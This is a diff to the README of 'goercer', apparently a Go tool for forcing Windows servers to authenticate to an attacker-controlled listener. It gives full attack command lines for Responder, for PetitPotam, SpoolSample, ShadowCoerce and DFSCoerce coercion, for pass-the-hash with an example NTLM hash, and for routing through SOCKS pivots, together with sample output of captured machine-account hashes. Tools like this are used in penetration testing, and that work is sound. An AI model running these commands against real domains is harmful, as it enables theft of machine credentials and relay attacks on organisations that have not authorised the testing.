@@ -17,11 +17,14 @@ cd goercer
 # 2. Start listener (Terminal 1)
 sudo responder -I eth0 -v
 
-# 3. Run attack (Terminal 2)
-./goercer <target> <listener> <user> <pass> <domain>
+# 3. Run attack (Terminal 2) - Password will be prompted if not provided
+./goercer -t <target> -l <listener> -u <user> -d <domain>
+
+# OR provide password/hash via flag
+./goercer -t <target> -l <listener> -u <user> -p <pass> -d <domain>
 
 # OR use NTLM hash (pass-the-hash)
-./goercer <target> <listener> <user> <hash> <domain>
+./goercer -t <target> -l <listener> -u <user> -H <hash> -d <domain>
 
 # 4. Capture hash in Responder
 # [SMB] NTLMv2-SSP Hash: MACHINE$::DOMAIN:...
@@ -47,11 +50,13 @@ sudo responder -I eth0 -v
 Successfully coerces Windows servers to authenticate to an attacker-controlled listener, capturing machine account NTLMv2 hashes.
 
 **Key Features**:
+- ✅ **Modern CLI Interface** - Flag-based arguments with automatic password prompting
 - ✅ **Pass-the-Hash Support** - Authenticate with NTLM hash instead of password
 - ✅ **SOCKS5 Proxy Support** - Route attacks through proxy servers
 - ✅ **4 Coercion Methods** - PetitPotam, SpoolSample, ShadowCoerce, DFSCoerce
 - ✅ **Alternative Named Pipes** - 5 pipe options for PetitPotam (lsarpc, efsr, samr, netlogon, lsass)
 - ✅ **PKT_PRIVACY Encryption** - Full DCERPC authentication with encryption/signing
+- ✅ **Verbose Mode** - Optional debug output with `-v` flag
 - ✅ **Single Binary** - No dependencies, portable Go executable
 
 **Supported Methods**:
@@ -66,8 +71,9 @@ Successfully coerces Windows servers to authenticate to an attacker-controlled l
 - Windows 10/11 (with appropriate services)
 
 **Authentication Methods**:
-- ✅ Password authentication (plaintext)
+- ✅ Password authentication (plaintext or prompted)
 - ✅ Pass-the-hash (NTLM hash - 32 hex characters)
+- ✅ Secure password prompting (hidden input when not provided via flag)
 
 **Result**: ✅ Machine account hashes captured via Responder
 
@@ -107,27 +113,56 @@ While this could be split into multiple files (`auth.go`, `petitpotam.go`, etc.)
 ## Usage
 
 ```bash
-./goercer <target_ip> <listener_ip> <username> <password|hash> <domain> [method] [pipe]
-
 # Show help
 ./goercer -h
 ./goercer --help
 ```
 
+### Command-Line Flags
+
+```
+Usage: goercer [OPTIONS]
+
+REQUIRED FLAGS:
+  -t, --target=STRING      Target server IP address
+  -l, --listener=STRING    Listener IP for callback (Responder/ntlmrelayx)
+  -u, --user=STRING        Domain username
+  -d, --domain=STRING      Domain name
+
+AUTHENTICATION (choose one or omit to be prompted):
+  -p, --password=STRING    Password (prompted if not provided)
+  -H, --hash=STRING        NTLM hash (32 hex characters)
+
+OPTIONAL FLAGS:
+  -m, --method=STRING      Coercion method: petitpotam, spoolsample, 
+                           shadowcoerce, dfscoerce (default: petitpotam)
+      --pipe=STRING        Named pipe (petitpotam only): lsarpc, efsr, 
+                           samr, netlogon, lsass (default: lsarpc)
+      --proxy=STRING       SOCKS5 proxy URL (e.g., socks5://127.0.0.1:1080)
+  -v, --verbose            Enable verbose/debug output
+  -h, --help               Display help message
+```
+
 ### Authentication
 
-**Password Authentication**:
+**Password Prompting** (most secure - no password in shell history):
 ```bash
-./goercer 10.0.0.10 10.0.0.5 john Password123 corp.local
+./goercer -t 10.0.0.10 -l 10.0.0.5 -u john -d corp.local
+# Enter password or NTLM hash: ********
+```
+
+**Password via Flag**:
+```bash
+./goercer -t 10.0.0.10 -l 10.0.0.5 -u john -p Password123 -d corp.local
 ```
 
 **Pass-the-Hash** (using NTLM hash):
 ```bash
 # Extract hash from secretsdump, hashdump, or other tools
-./goercer 10.0.0.10 10.0.0.5 john 8846f7eaee8fb117ad06bdd830b7586c corp.local
+./goercer -t 10.0.0.10 -l 10.0.0.5 -u john -H 8846f7eaee8fb117ad06bdd830b7586c -d corp.local
 ```
 
-The tool automatically detects if you're providing a password or NTLM hash (32 hex characters).
+The tool automatically detects if you're providing a password or NTLM hash (32 hex characters) when using the prompt.
 
 ### SOCKS5 Proxy Support
 
@@ -139,11 +174,11 @@ The tool automatically detects if you're providing a password or NTLM hash (32 h
 ssh -D 1080 user@pivot-host
 
 # Route attack through proxy
-./goercer 10.0.0.10 10.0.0.5 john Password123 corp.local --proxy socks5://127.0.0.1:1080
+./goercer -t 10.0.0.10 -l 10.0.0.5 -u john -p Password123 -d corp.local --proxy socks5://127.0.0.1:1080
 
 # Works with all methods and authentication modes
-./goercer 10.0.0.10 10.0.0.5 john hash corp.local spoolsample --proxy socks5://127.0.0.1:1080
-./goercer 10.0.0.10 10.0.0.5 john Password123 corp.local petitpotam efsr --proxy socks5://127.0.0.1:1080
+./goercer -t 10.0.0.10 -l 10.0.0.5 -u john -H <hash> -d corp.local -m spoolsample --proxy socks5://127.0.0.1:1080
+./goercer -t 10.0.0.10 -l 10.0.0.5 -u john -p Password123 -d corp.local -m petitpotam --pipe efsr --proxy socks5://127.0.0.1:1080
 ```
 
 **How it works**:
@@ -160,23 +195,51 @@ ssh -D 1080 user@pivot-host
 ### Help Output
 
 ```
-Usage: goercer <target_ip> <listener_ip> <username> <password|hash> <domain> [method] [pipe]
+Usage: goercer [OPTIONS]
 
-Methods:
-  petitpotam     - MS-EFSRPC coercion (default)
-  spoolsample    - MS-RPRN print spooler coercion
-  shadowcoerce   - MS-FSRVP volume shadow copy coercion
-  dfscoerce      - MS-DFSNM DFS namespace coercion
+DESCRIPTION
+    Coerces Windows servers to authenticate to an attacker-controlled listener
 
-Pipes (for petitpotam only):
-  lsarpc (default), efsr, samr, netlogon, lsass
-
-Examples:
-  ./goercer <target> <listener> <user> <pass> <domain> petitpotam
-  ./goercer <target> <listener> <user> 8846f7eaee8fb117ad06bdd830b7586c <domain> petitpotam
-  ./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
-  ./goercer <target> <listener> <user> <pass> <domain> spoolsample
+OPTIONS
+    -d, --domain=STRING      Domain name
+    -H, --hash=STRING        NTLM hash (32 hex characters)
+    -h, --help               Display this help message
+    -l, --listener=STRING    Listener IP for callback (Responder/ntlmrelayx)
+    -m, --method=STRING      Coercion method: petitpotam, spoolsample,
+                             shadowcoerce, dfscoerce
+    -p, --password=STRING    Password (prompted if not provided)
+        --pipe=STRING        Named pipe (petitpotam only): lsarpc, efsr,
+                             samr, netlogon, lsass
+        --proxy=STRING       SOCKS5 proxy URL (e.g., socks5://127.0.0.1:1080)
+    -t, --target=STRING      Target server IP address
+    -u, --user=STRING        Domain username
+    -v, --verbose            Enable verbose/debug output
 ```
+
+### Verbose Mode
+
+Enable detailed debug output with `-v` or `--verbose`:
+
+```bash
+# Normal output (clean and concise)
+./goercer -t 10.0.0.10 -l 10.0.0.5 -u john -d corp.local -m spoolsample
+# [+] SMB authenticated
+# [*] Using SpoolSample coercion technique...
+# [+] Coercion triggered via opnum 62
+
+# Verbose output (detailed debugging)
+./goercer -t 10.0.0.10 -l 10.0.0.5 -u john -d corp.local -m spoolsample -v
+# [DEBUG] NTLM Negotiate (40 bytes): 4e544c4d...
+# [DEBUG] Bind packet (120 bytes): 05000b03...
+# [DEBUG] Challenge flags: 0x62890235
+# ... detailed packet dumps and crypto operations ...
+```
+
+Use verbose mode for:
+- Troubleshooting authentication issues
+- Understanding NTLM/DCERPC internals
+- Debugging packet construction
+- Learning attack mechanics
 
 ### Quick Start
 
